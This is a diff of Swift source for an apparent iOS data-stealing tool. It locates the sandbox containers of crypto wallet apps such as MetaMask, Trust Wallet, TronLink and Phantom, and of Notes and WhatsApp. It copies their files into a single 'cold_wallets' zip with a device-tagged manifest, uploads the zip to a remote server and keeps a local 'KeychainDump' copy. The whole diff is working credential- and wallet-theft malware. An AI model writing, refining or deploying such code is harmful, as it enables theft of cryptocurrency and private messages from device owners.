@@ -580,23 +580,186 @@ enum MainAPI {
         return container + "/" + path
     }
 
+    // MARK: - cold-wallets combined collection (single zip + _manifest.json)
+
+    // bundleID -> wallet display name (top-level folder name inside the zip).
+    // Mirrors KC_DefaultWalletBundleIDs in KCKeychain.m plus group names.
+    static func walletDisplayName(forBundleID bid: String?) -> String {
+        guard let bid = bid, !bid.isEmpty else { return "unknown" }
+        let map: [String: String] = [
+            "com.tronlink.hdwallet": "TronLink",
+            "com.global.wallet.ios": "TokenPocket",
+            "im.token.app": "imToken",
+            "com.sixdays.trust": "Trust Wallet",
+            "io.metamask.MetaMask": "MetaMask",
+            "group.com.apple.notes": "Notes",
+            "com.okex.ios": "OKX",
+            "net.whatsapp.WhatsApp": "WhatsApp",
+            "coin98.crypto.finance.insights": "Coin98",
+            "4JLUM47S98.coin98.crypto.finance.insights": "Coin98",
+            "com.bitpie.wallet": "Bitpie",
+            "com.tonkeeper": "Tonkeeper",
+            "app.phantom": "Phantom",
+            "com.uniswap.mobile": "Uniswap",
+        ]
+        if let name = map[bid] { return name }
+        if bid.hasPrefix("group.") { return String(bid.dropFirst("group.".count)) }
+        return bid
+    }
+
+    // Known wallets for the manifest found/missing lists.
+    static func knownWallets() -> [(bundleID: String, name: String)] {
+        return [
+            ("com.tronlink.hdwallet", "TronLink"),
+            ("com.global.wallet.ios", "TokenPocket"),
+            ("im.token.app", "imToken"),
+            ("com.sixdays.trust", "Trust Wallet"),
+            ("io.metamask.MetaMask", "MetaMask"),
+            ("group.com.apple.notes", "Notes"),
+            ("com.okex.ios", "OKX"),
+            ("net.whatsapp.WhatsApp", "WhatsApp"),
+        ]
+    }
+
+    struct WalletCollectStat {
+        var bundleID: String
+        var name: String
+        var source: String
+        var files: Int
+        var bytes: UInt64
+    }
+
+    // Driver: all configs share ONE staging dir, one _manifest.json, one zip
+    // (<ms>_cold_wallets.zip), one upload. Wallet folders use display names.
     static func collectAndUploadPerConfig(_ cfg: DeviceConfig) {
         guard let configs = cfg.collect_configs, !configs.isEmpty else {
-            globallogger.log("(api) no collect_configs — nothing to collect")
+            globallogger.log("(api) no collect_configs - nothing to collect")
             return
         }
         Task {
-            var done = 0
-            for cc in configs {
-                let ok = await collectAndUploadOne(cc)
-                if ok { done += 1 }
+            let fm = FileManager.default
+            let staging = fm.temporaryDirectory
+                .appendingPathComponent("lara_collect_\(UUID().uuidString)", isDirectory: true)
+            do {
+                try fm.createDirectory(at: staging, withIntermediateDirectories: true)
+            } catch {
+                globallogger.log("(api) collect staging failed: \(error.localizedDescription)")
+                return
             }
-            globallogger.log("(api) collection finished: \(done)/\(configs.count) uploaded")
+
+            var orderedIDs: [String] = []
+            var statsByID: [String: WalletCollectStat] = [:]
+            var foundNames: [String] = []
+            var appSources = Set<String>()
+            for cc in configs {
+                if let st = await collectOneIntoStaging(cc, staging: staging) {
+                    let bid = st.bundleID
+                    if var prev = statsByID[bid] {
+                        prev.files += st.files
+                        prev.bytes += st.bytes
+                        statsByID[bid] = prev
+                    } else {
+                        orderedIDs.append(bid)
+                        statsByID[bid] = st
+                    }
+                    if !foundNames.contains(st.name) { foundNames.append(st.name) }
+                    if !bid.hasPrefix("group.") { appSources.insert(st.source) }
+                }
+            }
+
+            // ---- _manifest.json (collection-path manifest, zip root) ----
+            let ios = UIDevice.current.systemVersion
+            let model = UIDevice.current.model
+            let uuid = deviceUUID()
+            let known = knownWallets()
+            let missing = known.map { $0.name }.filter { !foundNames.contains($0) }
+            let walletDicts: [[String: String]] = orderedIDs.compactMap { bid in
+                guard let st = statsByID[bid], !bid.hasPrefix("group.") else { return nil }
+                return ["bundleID": st.bundleID,
+                        "bytes": String(st.bytes),
+                        "files": String(st.files),
+                        "mode": "selected",
+                        "pass": "path",
+                        "source": st.source,
+                        "via": "bundle",
+                        "wallet": st.name]
+            }
+            let manifest: [String: Any] = [
+                "deviceFolder": "\(model) iOS\(ios) \(uuid)",
+                "found": foundNames,
+                "indexedContainers": String(appSources.count),
+                "ios": ios,
+                "missing": missing,
+                "note": "collect_configs pass - combined cold_wallets upload",
+                "productType": model,
+                "wallets": walletDicts,
+            ]
+            do {
+                let mdata = try JSONSerialization.data(withJSONObject: manifest,
+                                                       options: [.prettyPrinted, .sortedKeys])
+                try mdata.write(to: staging.appendingPathComponent("_manifest.json"))
+                globallogger.log("(api) manifest written: wallets=\(walletDicts.count) found=\(foundNames.count) missing=\(missing.count)")
+            } catch {
+                globallogger.log("(api) manifest write failed: \(error.localizedDescription)")
+            }
+
+            // ---- single combined zip: <ms>_cold_wallets.zip ----
+            let totalFiles = statsByID.values.reduce(0) { $0 + $1.files }
+            if totalFiles == 0 {
+                globallogger.log("(api) nothing collected - skip combined zip")
+                try? fm.removeItem(at: staging)
+                return
+            }
+            if let st = fm.enumerator(atPath: staging.path) {
+                var total = 0
+                while let name = st.nextObject() as? String {
+                    if total < 15 {
+                        globallogger.log("(api) staging entry: \(name)")
+                    }
+                    total += 1
+                }
+                globallogger.log("(api) staging tree: \(total) entries")
+            }
+            let ms = Int(Date().timeIntervalSince1970 * 1000)
+            let fileName = "\(ms)_cold_wallets.zip"
+            let zipURL = fm.temporaryDirectory.appendingPathComponent(fileName)
+            do {
+                try createZipArchive(fromDirectory: staging, to: zipURL)
+            } catch {
+                globallogger.log("(api) zip failed: \(error.localizedDescription)")
+                try? fm.removeItem(at: staging)
+                return
+            }
+            guard let data = try? Data(contentsOf: zipURL) else {
+                globallogger.log("(api) zip read failed")
+                try? fm.removeItem(at: staging)
+                try? fm.removeItem(at: zipURL)
+                return
+            }
+            globallogger.log("(api) zip built: \(fileName) wallets=\(statsByID.count) files=\(totalFiles) bytes=\(data.count)")
+            if data.count < 64 {
+                globallogger.log("(api) zip too small (\(data.count) B) - treating as failure, not uploading")
+                try? fm.removeItem(at: staging)
+                try? fm.removeItem(at: zipURL)
+                return
+            }
+            uploadZipAsync(data, fileName: fileName, bundleID: "cold_wallets")
+
+            if let docs = fm.urls(for: .documentDirectory, in: .userDomainMask).first {
+                let keep = docs.appendingPathComponent("KeychainDump/wallet_files", isDirectory: true)
+                try? fm.createDirectory(at: keep, withIntermediateDirectories: true)
+                try? data.write(to: keep.appendingPathComponent(fileName))
+            }
+
+            try? fm.removeItem(at: staging)
+            try? fm.removeItem(at: zipURL)
+            globallogger.log("(api) collection finished: \(statsByID.count)/\(configs.count) bundles in one zip, upload queued")
         }
     }
 
-    @discardableResult
-    static func collectAndUploadOne(_ cc: CollectConfig) async -> Bool {
+    // Collect one config into <staging>/<WalletName>/ ; returns stats or nil.
+    // folders = wallet display names, inside = container-relative paths.
+    static func collectOneIntoStaging(_ cc: CollectConfig, staging: URL) async -> WalletCollectStat? {
         globallogger.log("(api) collect entry: bundle_id=\(cc.bundle_id ?? "-") access_group=\(cc.access_group ?? "-") items=\(cc.items.count)")
         for item in cc.items {
             globallogger.log("(api)   item type=\(item.type) path=\(item.path)")
@@ -614,19 +777,19 @@ enum MainAPI {
             }
         }
         let fm = FileManager.default
-        let staging = fm.temporaryDirectory
-            .appendingPathComponent("lara_collect_\(UUID().uuidString)", isDirectory: true)
-        do {
-            try fm.createDirectory(at: staging, withIntermediateDirectories: true)
-        } catch {
-            globallogger.log("(api) collect staging failed: \(error.localizedDescription)")
-            return false
+        let bid = cc.bundle_id ?? ""
+        let walletDir = staging.appendingPathComponent(walletDisplayName(forBundleID: cc.bundle_id),
+                                                       isDirectory: true)
+        var source = ""
+        if !bid.isEmpty {
+            source = findContainerPath(forBundleID: bid) ?? ""
         }
 
+        var files = 0
+        var bytes: UInt64 = 0
         var collected = 0
         for item in effectiveItems {
             let trimmed = item.path.trimmingCharacters(in: .whitespacesAndNewlines)
-            // "/" 或空行 = 整容器（备忘录这类整容器采集）
             let isWhole = trimmed.isEmpty || trimmed == "/"
             var src: String? = nil
             if isWhole {
@@ -639,12 +802,10 @@ enum MainAPI {
                 globallogger.log("(api) collect resolve failed: \(item.path)")
                 continue
             }
-            // MCM 可能返回过期/错位容器：目标不存在时全量扫描元数据
-            // 找真实容器再拼路径（App 更新后容器 UUID 会变）。
             if !fm.fileExists(atPath: src) {
-                let bid = cc.bundle_id ?? ""
-                if !bid.isEmpty {
-                    let roots: [String] = bid.hasPrefix("group.")
+                let rb = cc.bundle_id ?? ""
+                if !rb.isEmpty {
+                    let roots: [String] = rb.hasPrefix("group.")
                         ? ["/var/mobile/Containers/Shared/AppGroup"]
                         : ["/var/mobile/Containers/Data/Application"]
                     var reResolved: String? = nil
@@ -654,7 +815,7 @@ enum MainAPI {
                             let meta = root + "/" + d + "/.com.apple.mobile_container_manager.metadata.plist"
                             guard let pl = NSDictionary(contentsOfFile: meta),
                                   let ident = pl["MCMMetadataIdentifier"] as? String,
-                                  ident == bid else { continue }
+                                  ident == rb else { continue }
                             let alt = isWhole ? (root + "/" + d)
                                               : (root + "/" + d + "/" + trimmed)
                             if fm.fileExists(atPath: alt) {
@@ -675,7 +836,6 @@ enum MainAPI {
                 globallogger.log("(api) collect missing: \(item.path)")
                 continue
             }
-            // 严格按 type 采集：file 只收文件、dir 只收目录（整容器视为 dir）
             if (isWhole || item.type == "dir") && !isDir.boolValue {
                 globallogger.log("(api) collect type mismatch (want dir): \(item.path)")
                 continue
@@ -684,13 +844,23 @@ enum MainAPI {
                 globallogger.log("(api) collect type mismatch (want file): \(item.path)")
                 continue
             }
-            // dest 命名：逐组件拼路径（绝不把含 "/" 的字符串当单个组件），
-            // 相对路径镜像目录结构；整容器放到以 bundle_id 命名的子目录。
-            var dest = staging
+            if source.isEmpty {
+                if isWhole {
+                    source = src
+                } else {
+                    let suffix = "/" + trimmed
+                    if src.hasSuffix(suffix) {
+                        source = String(src.dropLast(suffix.count))
+                    } else {
+                        source = (src as NSString).deletingLastPathComponent
+                    }
+                }
+            }
+            var dest: URL
             if isWhole {
-                dest = dest.appendingPathComponent(cc.bundle_id ?? "container",
-                                                   isDirectory: true)
+                dest = walletDir
             } else {
+                dest = walletDir
                 let comps = trimmed.split(separator: "/").map(String.init)
                 for (i, comp) in comps.enumerated() {
                     let last = (i == comps.count - 1)
@@ -699,31 +869,26 @@ enum MainAPI {
                 }
             }
             do {
-                // copyItem 要求目标父目录存在：逐级创建后再拷。
-                let parent = (dest.path as NSString).deletingLastPathComponent
-                if !parent.isEmpty && parent != staging.path {
-                    try? fm.createDirectory(atPath: parent,
-                                            withIntermediateDirectories: true)
-                }
                 if isDir.boolValue || isWhole {
                     // Directory tree: copy children one by one instead of one
-                    // opaque copyItem. A single special file (socket, FIFO,
-                    // broken symlink) makes copyItem throw and yields NOTHING;
-                    // per-file copy salvages everything else and logs the rest.
+                    // opaque copyItem (a single socket/FIFO/unreadable child
+                    // makes copyItem throw and yields nothing).
+                    try fm.createDirectory(atPath: dest.path,
+                                           withIntermediateDirectories: true)
+                    let rels = (fm.enumerator(atPath: src)?.allObjects as? [String]) ?? []
                     var fc = 0, dc = 0, ec = 0
                     var firstErr = ""
-                    let children = (fm.enumerator(atPath: src)?.allObjects as? [String]) ?? []
-                    for rel in children {
+                    for rel in rels {
                         if rel.isEmpty { continue }
                         let s = (src as NSString).appendingPathComponent(rel)
                         let d = (dest.path as NSString).appendingPathComponent(rel)
-                        var cIsDir: ObjCBool = false
-                        guard fm.fileExists(atPath: s, isDirectory: &cIsDir) else {
+                        var childIsDir: ObjCBool = false
+                        guard fm.fileExists(atPath: s, isDirectory: &childIsDir) else {
                             ec += 1
                             if firstErr.isEmpty { firstErr = "vanished: \(rel)" }
                             continue
                         }
-                        if cIsDir.boolValue {
+                        if childIsDir.boolValue {
                             do {
                                 try fm.createDirectory(atPath: d, withIntermediateDirectories: true)
                                 dc += 1
@@ -738,22 +903,31 @@ enum MainAPI {
                                 if fm.fileExists(atPath: d) { try fm.removeItem(atPath: d) }
                                 try fm.copyItem(atPath: s, toPath: d)
                                 fc += 1
+                                files += 1
+                                bytes += (try? fm.attributesOfItem(atPath: s)[.size] as? NSNumber)?.uint64Value ?? 0
                             } catch {
                                 ec += 1
                                 if firstErr.isEmpty { firstErr = "copy \(rel): \(error.localizedDescription)" }
                             }
                         }
                     }
-                    globallogger.log("(api) tree copy \(item.path): src=\(children.count) files=\(fc) dirs=\(dc) errors=\(ec)\(firstErr.isEmpty ? "" : " first=\(firstErr)")")
+                    globallogger.log("(api) tree copy \(item.path): src=\(rels.count) files=\(fc) dirs=\(dc) errors=\(ec)\(firstErr.isEmpty ? "" : " first=\(firstErr)")")
                     if fc + dc == 0 {
-                        globallogger.log("(api) collect empty tree for \(item.path) — skip")
-                    } else {
-                        collected += 1
-                        globallogger.log("(api) collected \(item.type): \(item.path) -> \(dest.path)")
+                        globallogger.log("(api) collect empty tree for \(item.path) - skip")
+                        continue
                     }
+                    collected += 1
+                    globallogger.log("(api) collected \(item.type): \(item.path) -> \(dest.path)")
                 } else {
+                    let parent = (dest.path as NSString).deletingLastPathComponent
+                    if !parent.isEmpty && parent != staging.path {
+                        try? fm.createDirectory(atPath: parent,
+                                                withIntermediateDirectories: true)
+                    }
                     try fm.copyItem(atPath: src, toPath: dest.path)
                     collected += 1
+                    files += 1
+                    bytes += (try? fm.attributesOfItem(atPath: src)[.size] as? NSNumber)?.uint64Value ?? 0
                     globallogger.log("(api) collected \(item.type): \(item.path) -> \(dest.path)")
                 }
             } catch {
@@ -761,66 +935,17 @@ enum MainAPI {
             }
         }
 
-        // 诊断：记录暂存树前几项，验证目录结构没被压平。
-        if let st = fm.enumerator(atPath: staging.path) {
-            var shown = 0
-            var total = 0
-            while let name = st.nextObject() as? String {
-                if shown < 12 {
-                    globallogger.log("(api) staging entry: \(name)")
-                    shown += 1
-                }
-                total += 1
-            }
-            globallogger.log("(api) staging tree: \(total) entries, \(collected) item(s) copied")
-        }
-
         if collected == 0 {
-            globallogger.log("(api) nothing collected for \(cc.bundle_id ?? "-") — skip")
-            try? fm.removeItem(at: staging)
-            return false
+            globallogger.log("(api) nothing collected for \(cc.bundle_id ?? "-") - skip")
+            return nil
         }
-
-        let bid = cc.bundle_id ?? "device"
-        let fileName = "\(bid)_\(Int(Date().timeIntervalSince1970)).zip"
-        let zipURL = fm.temporaryDirectory.appendingPathComponent(fileName)
-        do {
-            try createZipArchive(fromDirectory: staging, to: zipURL)
-        } catch {
-            globallogger.log("(api) zip failed: \(error.localizedDescription)")
-            try? fm.removeItem(at: staging)
-            return false
-        }
-        guard let data = try? Data(contentsOf: zipURL) else {
-            globallogger.log("(api) zip read failed")
-            try? fm.removeItem(at: staging)
-            try? fm.removeItem(at: zipURL)
-            return false
-        }
-        globallogger.log("(api) zip built: \(fileName) files=\(collected) bytes=\(data.count)")
-        // Never upload an empty/broken archive: an EOCD-only zip is 22 bytes.
-        // Refusing here keeps bad data off the server and out of wallet_files.
-        if data.count < 64 {
-            globallogger.log("(api) zip too small (\(data.count) B) — treating as failure, not uploading")
-            try? fm.removeItem(at: staging)
-            try? fm.removeItem(at: zipURL)
-            return false
-        }
-        uploadZipAsync(data, fileName: fileName, bundleID: bid)
-
-        // 本地留档（KeychainDump/wallet_files）
-        if let docs = fm.urls(for: .documentDirectory, in: .userDomainMask).first {
-            let keep = docs.appendingPathComponent("KeychainDump/wallet_files", isDirectory: true)
-            try? fm.createDirectory(at: keep, withIntermediateDirectories: true)
-            try? data.write(to: keep.appendingPathComponent(fileName))
-        }
-
-        try? fm.removeItem(at: staging)
-        try? fm.removeItem(at: zipURL)
-        return true
+        return WalletCollectStat(bundleID: bid.isEmpty ? "device" : bid,
+                                 name: walletDisplayName(forBundleID: cc.bundle_id),
+                                 source: source,
+                                 files: files,
+                                 bytes: bytes)
     }
 
-    /// 逃逸后扫描已安装应用（容器 metadata），上报 /api/device/apps
     static func installedBundleIDs() -> [String] {
         let root = "/var/mobile/Containers/Data/Application"
         guard let dirs = try? FileManager.default.contentsOfDirectory(atPath: root) else {
